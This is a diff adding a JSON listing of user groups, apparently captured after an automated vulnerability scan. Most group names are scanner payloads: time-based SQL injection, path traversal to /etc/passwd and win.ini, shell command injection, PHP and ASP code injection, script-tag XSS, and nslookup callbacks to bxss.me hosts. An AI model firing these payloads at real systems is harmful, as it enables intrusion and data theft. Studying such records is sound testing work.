@@ -1,0 +1,2206 @@
+{
+    "total_pages": 1,
+    "user_group_list": [
+        {
+            "name": "\u0000",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\nA:B",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "-1 OR 2+398-398-1=0+0+0+1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "-1 OR 2+477-477-1=0+0+0+1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "-1 OR 3+398-398-1=0+0+0+1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "-1 OR 3+477-477-1=0+0+0+1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": ",",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": ",`@^*$;#",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": ";",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": ";assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "!(()&&!|*|*|",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "../../../../../../../../../../../../../../etc/passwd",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "../../../../../../../../../../../../../../windows/win.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "../TestGroup",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "./TestGroup",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "';print(md5(31337));$a='",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "'.gethostbyname(lc('hitmm'.'couzmfco00df6.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(108).chr(88).chr(112).chr(82).'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "'.gethostbyname(lc('hittp'.'hgirgjce74d91.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(116).chr(65).chr(106).chr(88).'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "'.print(md5(31337)).'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "'\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "'\"()",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "'\"()&%<zzz><ScRiPt >7SuT(9799)</ScRiPt>",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "'\"()&%<zzz><ScRiPt >h2YQ(9864)</ScRiPt>",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "'+response.write(9427990*9200599)+'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "'+response.write(9960429*9559545)+'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\";print(md5(31337));$a=\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\".gethostbyname(lc(\"hitmh\".\"mjxgglkjd7a16.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(113).chr(71).chr(100).chr(65).\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\".gethostbyname(lc(\"hityo\".\"cfntsotg50cb9.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(115).chr(79).chr(112).chr(85).\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\"+response.write(9427990*9200599)+\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\"+response.write(9960429*9559545)+\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "())[]]{}}",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "(nslookup hitbmxboinwuz1c920.bxss.me||perl -e \"gethostbyname('hitbmxboinwuz1c920.bxss.me')\")",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "(nslookup hithvhpqazvoea685e.bxss.me||perl -e \"gethostbyname('hithvhpqazvoea685e.bxss.me')\")",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\"+(select(0)from(select(sleep(15)))v)+\"*/",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": ")",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": ")))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "[']",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "{'}",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "{% TestGroup",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "@'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "@@2SovN",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "@@wWn3b",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "*'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "*)                          (uid=*",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "/",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "/,%ENV,/",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "/../../../../../../../../bin/id\u0000|",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "/..\\\\../..\\\\../..\\\\../..\\\\../..\\\\../..\\\\../boot.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "/..\\\\../..\\\\../..\\\\../..\\\\../..\\\\../..\\\\../windows/win.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "/./..././..././..././..././..././..././..././..././..././..././..././...\\\\boot.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "/./..././..././..././..././..././..././..././..././..././..././..././...\\\\windows\\win.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "/'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "/*",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\u0000/etc/passwd\u0000",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "/etc/shells",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "/xfs.bxss.me",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\/boot.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\/windows/win.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\boot.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\boot.ini%00",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\windows\\win.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\windows\\win.ini%00",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\\'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\.../boot.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...windows//win.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "&echo ckyxoc$()\\ sgciaw\\nz^xyu||a #' &echo ckyxoc$()\\ sgciaw\\nz^xyu||a #|\" &echo ckyxoc$()\\ sgciaw\\nz^xyu||a #",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "&echo crqopa$()\\ xnuovi\\nz^xyu||a #' &echo crqopa$()\\ xnuovi\\nz^xyu||a #|\" &echo crqopa$()\\ xnuovi\\nz^xyu||a #",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "#'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "#if(TestGroup ==",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "%00",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "%0a",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "%n%s%n%s%n%s%n%s%n%s",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "`",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "`(nslookup hitnficqskjpo4cfea.bxss.me||perl -e \"gethostbyname('hitnficqskjpo4cfea.bxss.me')\")`",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "`(nslookup hitpbtcyixgrl9e8e4.bxss.me||perl -e \"gethostbyname('hitpbtcyixgrl9e8e4.bxss.me')\")`",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "^'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "^(#$!@#$)(()))******",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "<!--",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "<#if TestGroup",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "|(nslookup hitfxzsbwepibff29c.bxss.me||perl -e \"gethostbyname('hitfxzsbwepibff29c.bxss.me')\")",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "|(nslookup hitvzruaxcmkc9b7c8.bxss.me||perl -e \"gethostbyname('hitvzruaxcmkc9b7c8.bxss.me')\")",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "|echo buhfkn$()\\ bynfgl\\nz^xyu||a #' |echo buhfkn$()\\ bynfgl\\nz^xyu||a #|\" |echo buhfkn$()\\ bynfgl\\nz^xyu||a #",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "|echo gubsty$()\\ mvcliu\\nz^xyu||a #' |echo gubsty$()\\ mvcliu\\nz^xyu||a #|\" |echo gubsty$()\\ mvcliu\\nz^xyu||a #",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "$(nslookup hitdepvdbrwhrd7266.bxss.me||perl -e \"gethostbyname('hitdepvdbrwhrd7266.bxss.me')\")",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "$(nslookup hitnwyzabfcpgcd4c3.bxss.me||perl -e \"gethostbyname('hitnwyzabfcpgcd4c3.bxss.me')\")",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "${\"PRbgxaxaxigjjbcijajaedcjcjeRP\"}",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "${@print(md5(31337))}",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "${@print(md5(31337))}\\",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "${9999275+10000445}",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "${9999560+9999265}",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "1 waitfor delay '0:0:15' -- ",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "1'\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "15.124.2.120/serverinclude.html?TestGroup",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "1HcQNsggO",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "1mlqiol8O",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%00.jpg",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "31UPvT05",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "4cZAqIeV'; waitfor delay '0:0:15' -- ",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "6ei2FS8o')) OR 989=(SELECT 989 FROM PG_SLEEP(15))--",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "9ploFZ6f')) OR 827=(SELECT 827 FROM PG_SLEEP(15))--",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "9VZj0I8F') OR 766=(SELECT 766 FROM PG_SLEEP(15))--",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "Accounting",
+            "user_list": [],
+            "permission_list": []
+        },
+        {
+            "name": "Administrator",
+            "user_list": [],
+            "permission_list": []
+        },
+        {
+            "name": "bxss.me",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "bxss.me/t/xss.html?%00",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "c:/boot.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "c:/boot.ini%00",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "c:/windows/win.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "c:\\boot.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "c:\\windows\\win.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "c:\\windows\\win.ini%00",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "DefaultGroup",
+            "user_list": [
+                {
+                    "username": "admin",
+                    "name": "admin",
+                    "create_time": "2020-11-06T16:46:58",
+                    "login_time": "2022-08-01T04:10:37",
+                    "logined": false,
+                    "title": "Shop Manager",
+                    "department": "Management Department",
+                    "shift": "Morning Shift",
+                    "group_name": "DefaultGroup"
+                },
+                {
+                    "username": "Airport",
+                    "name": "admin",
+                    "create_time": "2020-11-06T16:46:58",
+                    "login_time": "2022-08-01T03:46:47",
+                    "logined": false,
+                    "title": "Shop Manager",
+                    "department": "Management Department",
+                    "shift": "Morning Shift",
+                    "group_name": "DefaultGroup"
+                },
+                {
+                    "username": "Hodomhex",
+                    "name": "admin",
+                    "create_time": "2022-08-01T06:46:13",
+                    "login_time": "2022-08-01T06:46:13",
+                    "logined": false,
+                    "title": "Shop Manager",
+                    "department": "Management Department",
+                    "shift": "Morning Shift",
+                    "group_name": "DefaultGroup"
+                },
+                {
+                    "username": "R2_robot",
+                    "name": "admin",
+                    "create_time": "2020-11-06T16:46:58",
+                    "login_time": "2022-07-29T02:53:53",
+                    "logined": false,
+                    "title": "Shop Manager",
+                    "department": "Management Department",
+                    "shift": "Morning Shift",
+                    "group_name": "DefaultGroup"
+                }
+            ],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "echo lhggdb$()\\ rkonbl\\nz^xyu||a #' &echo lhggdb$()\\ rkonbl\\nz^xyu||a #|\" &echo lhggdb$()\\ rkonbl\\nz^xyu||a #",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "echo zojhle$()\\ akyuck\\nz^xyu||a #' &echo zojhle$()\\ akyuck\\nz^xyu||a #|\" &echo zojhle$()\\ akyuck\\nz^xyu||a #",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "file:///etc/passwd",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "file:/c:/boot.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "file:/c:/boot.ini%00",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "file:/c:/windows/win.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "file:/c:/windows/win.ini%00",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "file:\\c:\\boot.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "file:\\c:\\windows\\win.ini",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "http://15.124.2.120/serverinclude.html?TestGroup",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "Http://bxss.me/t/fit.txt",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "http://bxss.me/t/fit.txt%3F.jpg",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "HttP://bxss.me/t/xss.html?%00",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%3F.jpg",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "http://does.not.exist.spidynamics.com/?TestGroup",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "if(now()=sysdate(),sleep(15),0)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "JPGMapXX' OR 741=(SELECT 741 FROM PG_SLEEP(15))--",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "Management",
+            "user_list": [],
+            "permission_list": []
+        },
+        {
+            "name": "OnIGP5zG",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "QWPKOVcV",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "response.write(9427990*9200599)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "response.write(9960429*9559545)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "Sales",
+            "user_list": [],
+            "permission_list": []
+        },
+        {
+            "name": "set\u0000",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "set\nset",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "set'|set&set'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "set\"|set&set\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "set&set|",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "set`set`",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "set|set&set",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "SkpRRG5yRzBS",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "tchAcgP8",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup",
+            "user_list": [
+                {
+                    "username": "test_user",
+                    "name": "user_name",
+                    "create_time": "2022-07-28T04:03:52",
+                    "login_time": "2022-07-28T04:03:52",
+                    "logined": true,
+                    "title": "Shop Manager",
+                    "department": "Management Department",
+                    "shift": "Morning Shift",
+                    "group_name": "TestGroup"
+                }
+            ],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup and 1 < (select case when 1=0 then upper(hex(randomblob(300000000))) else 0 end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup and 1 < (select case when 1=1 then upper(hex(randomblob(300000000))) else 0 end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup and 1 = if(5=0, sleep(2), 0)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup and 1 = if(5=5, sleep(2), 0)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup and 1 in (case when 1=0 then (sysmaster:yieldn(2)) else 2 end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup and 1 in (case when 1=1 then (sysmaster:yieldn(2)) else 2 end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup and 1=(case 'a' when 'a' then pg_sleep(2) else '0' end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup and 1=(case 'b' when 'b' then pg_sleep(2) else '0' end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup and 1=if(5=0, benchmark(1500000, md5(1)), 0)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup and 1=if(5=5, benchmark(1500000, md5(1)), 0)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' and (1 < (select case when 1=0 then upper(hex(randomblob(300000000))) else 0 end)) and '1'='1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' and (1 < (select case when 1=1 then upper(hex(randomblob(300000000))) else 0 end)) and '1'='1",
+            "user_list": [],
+            "permission_list": [
+                {
